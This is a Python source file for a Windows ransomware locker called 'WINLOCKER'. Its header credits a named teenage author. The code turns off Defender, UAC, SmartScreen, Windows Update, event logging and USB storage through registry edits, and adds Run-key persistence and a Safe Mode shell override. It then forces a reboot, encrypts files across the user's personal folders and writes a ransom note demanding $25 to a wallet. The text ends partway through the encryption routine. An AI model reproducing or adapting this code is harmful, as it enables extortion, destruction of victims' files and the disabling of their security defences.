# CREATOR 
# GitHub https://github.com/cppandpython
# NAME: Vladislav 
# SURNAME: Khudash  
# AGE: 17

# DATE: 15.10.2025
# APP: WINLOCKER
# TYPE: OS_LOCKER
# VERSION: LATEST
# PLATFORM: win32


WALLET = 'HERE IS LINCLOKER WALLET'
PASSWORD = 'HERE IS LINLOCKER PASSWORD'
KEY = 'HERE IS LINLOCKER ENCRYPTOR PASSWORD'


from winreg import (
    OpenKey, 
    CreateKey, 
    DeleteKey, 
    SetValueEx, 
    DeleteValue, 
    QueryValueEx,
    REG_SZ, 
    KEY_READ,
    KEY_WRITE,
    REG_DWORD, 
    REG_EXPAND_SZ, 
    KEY_SET_VALUE, 
    HKEY_CURRENT_USER, 
    HKEY_LOCAL_MACHINE
)
from os import walk, abort, mkdir, remove, replace, getlogin, startfile
from platform import node, system, release, win32_edition
from tkinter import Tk, Label, Entry, Button, PhotoImage
from tkinter.messagebox import showinfo, showerror
from subprocess import run, PIPE, Popen, DEVNULL
from os.path import exists, split as split_path
from time import ctime, sleep, localtime
from pyAesCrypt import encryptFile
from keyboard import block_key
from threading import Thread
from shutil import move, copy 
from re import findall 
from glob import glob


USER = getlogin()


def regedit(reg_path, name, value, object_type, mode, current_user=False):
    match mode:
        case 0:
            with CreateKey(HKEY_LOCAL_MACHINE if not current_user else HKEY_CURRENT_USER, reg_path): 
                return
        case 1:
            match object_type: 
                case 0:
                    reg_type = REG_DWORD
                case 1: 
                    reg_type = REG_SZ
                case _: 
                    reg_type = REG_EXPAND_SZ

            with OpenKey(HKEY_LOCAL_MACHINE if not current_user else HKEY_CURRENT_USER, reg_path, 0, KEY_SET_VALUE) as reg_key: 
                SetValueEx(reg_key, name, 0, reg_type, value)
        case _:
            with OpenKey(HKEY_LOCAL_MACHINE, reg_path, 0, KEY_SET_VALUE) as reg_key: 
                if mode == 3 :
                    DeleteKey(reg_key, name) 
                else:
                    DeleteValue(reg_key, name)


def regedit_change(): 
    for reg_directory in [
        (r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System', None, None, None, 0), 
        (r'SYSTEM\CurrentControlSet\Control\SafeBoot', None, None, None, 0), 
        (r'SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal', None, None, None, 0), 
        (r'SYSTEM\CurrentControlSet\Control\SafeBoot\Network', None, None, None, 0), 
        (r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Associations', None, None, None, 0), 
        (r'SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer', None, None, None, 0), 
        (r'SOFTWARE\Policies\Microsoft\Windows\System', None, None, None, 0), 
        (r'SOFTWARE\Policies\Microsoft\Windows Defender', None, None, None, 0), 
        (r'SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection', None, None, None, 0), 
        (r'SOFTWARE\Policies\Microsoft\Windows Defender\Spynet', None, None, None, 0), 
        (r'SYSTEM\CurrentControlSet\Services\mpssvc', None, None, None, 0), 
        (r'SOFTWARE\Microsoft\Windows Defender Security Center\Notifications', None, None, None, 0), 
        (r'SOFTWARE\Policies\Microsoft\Windows Defender Security Center', None, None, None, 0), 
        (r'SYSTEM\CurrentControlSet\Services\SecurityHealthService', None, None, None, 0), 
        (r'SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications', None, None, None, 0), 
        (r'SYSTEM\CurrentControlSet\Services\MDCoreSvc', None, None, None, 0), 
        (r'SYSTEM\CurrentControlSet\Services\WinDefend', None, None, None, 0), 
        (r'SYSTEM\CurrentControlSet\Services\Sense ', None, None, None, 0),
        (r'SYSTEM\CurrentControlSet\Services\WdBoot', None, None, None, 0), 
        (r'SYSTEM\CurrentControlSet\Services\WdFilter', None, None, None, 0), 
        (r'SYSTEM\CurrentControlSet\Services\WdNisDrv', None, None, None, 0), 
        (r'SYSTEM\CurrentControlSet\Services\WdNisSvc', None, None, None, 0), 
        (r'SYSTEM\CurrentControlSet\Services\wscsvc', None, None, None, 0), 
        (r'SYSTEM\CurrentControlSet\Services\wuauserv', None, None, None, 0), 
        (r'SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate', None, None, None, 0), 
        (r'SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU', None, None, None, 0), 
        (r'SYSTEM\CurrentControlSet\Services\BDESVC', None, None, None, 0), 
        (r'SYSTEM\CurrentControlSet\Services\EventLog', None, None, None, 0), 
        (r'SYSTEM\CurrentControlSet\Services\Winmgmt', None, None, None, 0), 
        (r'SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced', None, None, None, 0), 
        (r'Software\Microsoft\Windows\CurrentVersion\Policies\System', None, None, None, 0), 
        (r'SYSTEM\CurrentControlSet\Services\USBSTOR', None, None, None, 0),
        (r'SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications', None, None, None, 0), 
        (r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', None, None, None, 0)
    ]:                   
        try: 
            if (reg_directory[0] == r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Associations'
                ) or (reg_directory[0] == r'SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced'
                ) or (reg_directory[0] == r'Software\Microsoft\Windows\CurrentVersion\Policies\System'
                ) or (reg_directory[0] == r'SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications'
            ) or reg_directory[0] == r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run':
                regedit(*reg_directory, current_user=True) 
            else:
                regedit(*reg_directory)
        except: 
            continue 

    for reg_value in [
        (r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System', 'EnableLUA', 0, 0, 1), 
        (r'SYSTEM\CurrentControlSet\Control\SafeBoot', 'AlternateShell', 'cmd.exe', 1, 1), 
        (r'SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal', '(Default)', '', 1, 1), 
        (r'SYSTEM\CurrentControlSet\Control\SafeBoot\Network', '(Default)', '', 1, 1), 
        (r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Associations', 'LowRiskFileTypes', '.zip;.rar;.nfo;.txt;.exe;.bat;.vbs;.com;.cmd;.reg;.msi;.htm;.html;.gif;.bmp;.jpg;.avi;.mpg;.mpeg;.mov;.mp3;.m3u;.wav;', 1, 1), 
        (r'SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer', 'SmartScreenEnabled', 'Off', 1, 1), 
        (r'SOFTWARE\Policies\Microsoft\Windows\System', 'EnableSmartScreen', 0, 0, 1), 
        (r'SOFTWARE\Policies\Microsoft\Windows Defender', 'DisableAntiSpyware', 1, 0, 1), 
        (r'SOFTWARE\Policies\Microsoft\Windows Defender', 'AllowFastServiceStartup', 0, 0, 1), 
        (r'SOFTWARE\Policies\Microsoft\Windows Defender', 'ServiceKeepAlive', 0, 0, 1), 
        (r'SOFTWARE\Policies\Microsoft\Windows Defender', 'DisableAntiVirus', 1, 0, 1), 
        (r'SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection', 'DisableIOAVProtection', 1, 0, 1), 
        (r'SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection', 'DisableRealtimeMonitoring', 1, 0, 1), 
        (r'SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection', 'DisableOnAccessProtection', 1, 0, 1), 
        (r'SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection', 'DisableScanOnRealtimeEnable', 1, 0, 1), 
        (r'SOFTWARE\Policies\Microsoft\Windows Defender\Spynet', 'DisableBlockAtFirstSeen', 1, 0, 1), 
        (r'SOFTWARE\Policies\Microsoft\Windows Defender\Spynet', 'LocalSettingOverrideSpynetReporting', 0, 0, 1), 
        (r'SOFTWARE\Policies\Microsoft\Windows Defender\Spynet', 'SubmitSamplesConsent', 2, 0, 1), 
        (r'SYSTEM\CurrentControlSet\Services\WinDefend', 'Start', 4, 0, 1), 
        (r'SYSTEM\CurrentControlSet\Services\MDCoreSvc', 'Start', 4, 0, 1), 
        (r'SYSTEM\CurrentControlSet\Services\Sense', 'Start', 4, 0, 1), 
        (r'SYSTEM\CurrentControlSet\Services\WdBoot', 'Start', 4, 0, 1),
        (r'SYSTEM\CurrentControlSet\Services\WdFilter', 'Start', 4, 0, 1), 
        (r'SYSTEM\CurrentControlSet\Services\WdNisDrv', 'Start', 4, 0, 1), 
        (r'SYSTEM\CurrentControlSet\Services\WdNisSvc', 'Start', 4, 0, 1), 
        (r'SYSTEM\CurrentControlSet\Services\wscsvc', 'Start', 4, 0, 1), 
        (r'SYSTEM\CurrentControlSet\Services\SecurityHealthService', 'Start', 4, 0, 1), 
        (r'SYSTEM\CurrentControlSet\Services\mpssvc', 'Start', 4, 0, 1), 
        (r'SOFTWARE\Microsoft\Windows Defender Security Center\Notifications', 'DisableNotifications', 1, 0, 1), 
        (r'SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications', 'DisableNotifications', 1, 0, 1), 
        (r'SYSTEM\CurrentControlSet\Services\wuauserv', 'Start', 4, 0, 1), 
        (r'SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate', 'DisableOSUpgrade', 1, 0, 1), 
        (r'SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate', 'DisableWindowsUpdateAccess', 1, 0, 1), 
        (r'SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate', 'DoNotConnectToWindowsUpdateInternetLocations', 1, 0, 1), 
        (r'SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate', 'UpdateServiceUrlAlternate', 'server.wsus', 1, 1), 
        (r'SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate', 'WUServer', 'server.wsus', 1, 1), 
        (r'SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate', 'WUStatusServer', 'server.wsus', 1, 1), 
        (r'SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU', 'NoAutoUpdate', 1, 0, 1), 
        (r'SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU', 'UseWUServer', 1, 0, 1), 
        (r'SYSTEM\CurrentControlSet\Services\BDESVC', 'Start', 4, 0, 1), 
        (r'SYSTEM\CurrentControlSet\Services\EventLog', 'Start', 4, 0, 1), 
        (r'SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced', 'Hidden', 0, 0, 1), 
        (r'SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced', 'ShowSuperHidden', 0, 0, 1), 
        (r'Software\Microsoft\Windows\CurrentVersion\Policies\System', 'DisableLockWorkstation', 1, 0, 1), 
        (r'SYSTEM\CurrentControlSet\Services\USBSTOR', 'Start', 4, 0, 1), 
        (r'SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications', 'ToastEnabled', 0, 0, 1), 
        (r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 'Windows Blocker', r'C:\Windows\Temp\Windows.system.blocker\Windows Blocker.exe', 1, 1)
    ]:
        try: 
            if (reg_value[0] == r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Associations'
                ) or (reg_value[0] == r'SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced'
                ) or (reg_value[0] == r'Software\Microsoft\Windows\CurrentVersion\Policies\System'
                ) or (reg_value[0] == r'SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications'
            ) or reg_value[0] == r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run':
                regedit(*reg_value, current_user=True) 
            else: 
                regedit(*reg_value)
        except: 
            continue 



def setup():
    for folder_path in [
        r'C:\Windows\Temp\Windows.system.blocker', 
        r'C:\Windows\Temp\Windows.system.blocker\sys',
        r'C:\Windows\Temp\Windows.system.blocker\language', 
        r'C:\Windows\Temp\Windows.system.blocker\scanner.mode', 
        r'C:\Windows\Temp\Windows.system.blocker\logo'
    ]:
        try: 
            mkdir(folder_path)
        except: 
            continue

    try: 
        run(r'attrib +h +s +r C:\Windows\Temp\Windows.system.blocker'.split(), 
            stdout=DEVNULL, stderr=DEVNULL, shell=True)
        move(f'{split_path(__file__)[-1].replace(".py", '.exe')}', 
             r'C:\Windows\Temp\Windows.system.blocker\Windows Blocker.exe')
    except: ...

    try:
        with open(r'C:\Windows\Temp\Windows.system.blocker\logo\logo.png', 'wb') as logo_png: 
            logo_png.write(b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x02\x00\x00\x00\x02\x00\x08\x06\x00\x00\x00\xf4x\xd4\xfa\x00\x00\x00\x04sBIT\x08\x08\x08\x08|\x08d\x88\x00\x00\x00\tpHYs\x00\x00\r\xd7\x00\x00\r\xd7\x01B(\x9bx\x00\x00\x00\x19tEXtSoftware\x00www.inkscape.org\x9b\xee<\x1a\x00\x00\x0b\x00IDATx\x9c\xed\xdd1oTg\x16\x80\xe1\xe3\xd1J\xa0\xac\xe9c\x89\x8a\x8e"e\xe4\x0eE\x88*\x92\x05\xd4\xfc\x02\x97\xd4\x1bQ\xa0lM\xc9/\xa0\xc6\x08)\xd5\nE\xe9P\xca\x14t\xae\x90\x9c\x1e\x83L\xe5-\xc6\xde\x05\x02\x04\x01\xf6\x08\xde\xe7\x91\xa6\xb93c\x9fj\xbew\xee\xcc\xdco\xed\xf0\xf0p>\xc4\xf3+\x9bgf\xe6\xf2\xcc\\\x9d\x99\x8b3\xb3qt[\xff\xa0?\x00|v\xff\xfc\xcf\xe3\xb5U\xfe\xff\xad\x9d\xeb\x1f\xf6\x02\x02\x9c\x84\xfd\x99\xd9;\xba=\x99\x99\x073\xf3\xe8\xe1\xb5\xfb/?\xe4\xc9k\x7f\x17\x00\xcf\xafln\xcc\xcc\xad\x99\xb913\xe7>iT\xe0\xb3\x12\x00\xc0\x1b\x9e\xcd\xcc\xbd\x99\xb9\xfd\xf0\xda\xfd\xbd\xf7=\xf0\x9d\x01\xf0\xfc\xca\xe6\xd9\x99\xf9ifn\xce\xcc7\x9f{B\xe0\xd3\t\x00\xe0\x1d^\xcc\xcc\x9d\x99\xf9\xf9\xe1\xb5\xfb\x07o{\xc0\xe2m\x07\x9f_\xd9\xfcvf~\x9d\x99\x7f\x8d\xc5\x1f\x00\xbe4\xdf\xccr\r\xffuk\xe7\xfa\xb7o{\xc0_\x02\xe0\xf9\x95\xcd\xeff\xe6\xf7\x99\xd9<\xd9\xd9\x00\x80\x13\xb693\xbfo\xed\\\xff\xee\xcd;^\x0b\x80\xa3w\xfe\xbf\xcc\xcc\xf9S\x1a\x0c\x008Y\xe7g\xe6\x977\xcf\x04\xfc/\x00\x8e>\xf3\xdf\x19\x8b?\x00|m\xce\xcf\xcc\xce\xd6\xce\xf5\xb3\xc7\x07^=\x03\xf0\xd38\xed\x0f\x00_\xab\xcdY\xae\xf53s\x14\x00G?\xf5\xbb\xb9\xaa\x89\x00\x80Sqsk\xe7\xfa\xc6\xcc\xff\xcf\x00\xdc\x1a\xdf\xf6\x07\x80\xaf\xdd7\xb3\\\xf3gqt\x85\xbf\x1b\xab\x9d\x07\x008%7\xb6v\xae\x9fY\xcc\xf2\xf2\xbe\xae\xf0\x07\x00\r\xe7f\xe6\xf2b\x96\xd7\xf6\x07\x00:\xae.f\xb9\xb1\x0f\x00\xd0qq1\xcb\x1d\xfd\x00\x80\x8e\r\x01\x00\x00=\x1b\x8b\x99Y_\xf5\x14\x00\xc0\xa9Z\x7f\xebn\x80\x00\xc0\xd7M\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08Z;<<\\\xf5\x0c\x00\xc0)s\x06\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80\xa0\x7f\\\xb8\xbb\x7f\xb8\xea!\x80\x8f\xb3\xbb\xbd\xbe\xb6\xd2\x01~;\xeb\xf5\x03\xbeP\xce\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10$\x00\x00 H\x00\x00@\x90\x00\x00\x80 \x01\x00\x00A\x02\x00\x00\x82\x04\x00\x00\x04\t\x00\x00\x08\x12\x00\x00\x10\xb4\x98\x99\xfdU\x0f\x01\x00\x9c\xaa\xfd\xc5\xcc\xec\xadz\n\x00\xe0T\xed\t\x00\x00\xe8\xd9[\xcc\xcc\x93UO\x01\x00\x9c\xaa\'\x8b\x99y\xb0\xea)\x00\x80S\xf5`13\x8ff\xe6\xd9\xaa\'\x01\x00N\xc5\xb3\x99y\xb4\xd8\xdd^\x7f93\xf7V=\r\x00p*\xee\xcd\xa5\x83\x97\xc7\xd7\x01\xb8=3/V9\r\x00p\xe2^\xccr\xcd_^\x08hw{}of\xee\xacr"\x00\xe0\xc4\xdd\x99K\x07{3\xaf_\t\xf0\xe7\x99y\xbc\x9ay\x00\x80\x13\xf6x\x96k\xfd\xcc\xbc\x12\x00\xbb\xdb\xeb\x073smf\x9e\xae`(\x00\xe0\xe4<\x9d\x99ks\xe9\xe0\xe0\xf8\xc0k{\x01\xecn\xaf\xff93?\x8e\x08\x00\x80\xaf\xc5\xd3\x99\xf9q.\x1d\xfc\xf9\xea\xc1\xbfl\x06\xb4\xbb\xbd\xfe\xc7\xcc|?>\x0e\x00\x80/\xdd\xe3\x99\xf9~.\x1d\xfc\xf1\xe6\x1do\xdd\r\xf0\xe8L\xc0\x0f3\xf3\xef\xf1\xeb\x00\x00\xf8\xd2\xbc\x98\xe5\x1a\xfe\xc3\x9b\xef\xfc\x8f\xad\x1d\x1e\x1e\xbe\xf7/\\\xb8\xbb\xbf13\xb7f\xe6\xc6\xcc\x9c\xfb\xdc\x13\x02\x1fow{}m\xa5\x03\xfcv\xf6\xfd/ \xc0i{6\xcbk\xfb\xdc>\xfe\xb6\xff\xbb\xfcm\x00\x1c\xbbpw\xff\xcc\xcc\\\x9e\x99\xab3sqf6\x8en\xeb\x9f4*\xf0\xd1\x04\x00\xa4\xed\xcfrC\xbf\xbdY\xee\xeb\xf3`f\x1e\xcd\xa5\x83\x97\x1f\xf2\xe4\xff\x02\x90\x02\xae^[v\x08\xf0\x00\x00\x00\x00IEND\xaeB`\x82')
    except: ...

    regedit_change()
    run('shutdown /f /r /t 0'.split(), stdout=DEVNULL, stderr=DEVNULL, shell=True)
    abort()


def window():


    def cryptographer():
        global entry_password
        
        for path_desktop in [
            rf'C:\Users\{USER}\Desktop', 
            rf'C:\Users\{USER}\OneDrive\Desktop', 
            rf'C:\Users\{USER}\OneDrive\Рабочий стол'
        ]:
            try: 
                with open(f'{path_desktop}\\REQUIREMENT.txt' if language == 'en' else f'{path_desktop}\\ТРЕБОВАНИЕ.txt', 'w', encoding='utf-8') as requirement_txt: 
                    if language == 'en':
                        requirement_txt.write(f'To decrypt files, you need to pay $25 for the service to this wallet --> {WALLET}\nIf you paid for the service, you will receive a file decryption program.')
                    else:
                        requirement_txt.write(f'Чтобы расшифровать файлы, вам необходимо заплатить $25 долларов за услугу, на этот кошелек --> {WALLET}\nЕсли вы оплатили услугу, вы получите программу для расшифровки файлов.')
            except: 
                continue
    


        def _cryptographer(directory):
            for folder_path in [_folder_path[0] for _folder_path in directory]: 
                for file_path in (glob(folder_path + '\\*')): 
                    try: 
                        if file_path[-3:] != '.cw':
                            encryptFile(file_path, file_path + '.cw', KEY)
                            remove(file_path)
                            replace(file_path + '.cw', file_path)
                    except: 
                        label_file_path['text'] = f'{file_path} no!'
                    else: 
                        label_file_path['text'] = f'{file_path} ok!'


        try:
            with open(r'C:\Windows\Temp\Windows.system.blocker\scanner.mode\mode.txt', 'r') as mode_txt: ...
        except: 
            for user_path in [
                list(walk(rf'C:\Users\{USER}\Favorites')), 
                list(walk(rf'C:\Users\{USER}\Desktop')), 
                list(walk(rf'C:\Users\{USER}\Downloads')), 
                list(walk(rf'C:\Users\{USER}\Documents')), 
                list(walk(rf'C:\Users\{USER}\Pictures')), 
                list(walk(rf'C:\Users\{USER}\Videos')), 
                list(walk(rf'C:\Users\{USER}\Music')), 
                list(walk(rf'C:\Users\{USER}\Contacts')), 
                list(walk(rf'C:\Users\{USER}\OneDrive'))
            ]: 
                try: 
                    _cryptographer(user_path)
                except: 
                    continue

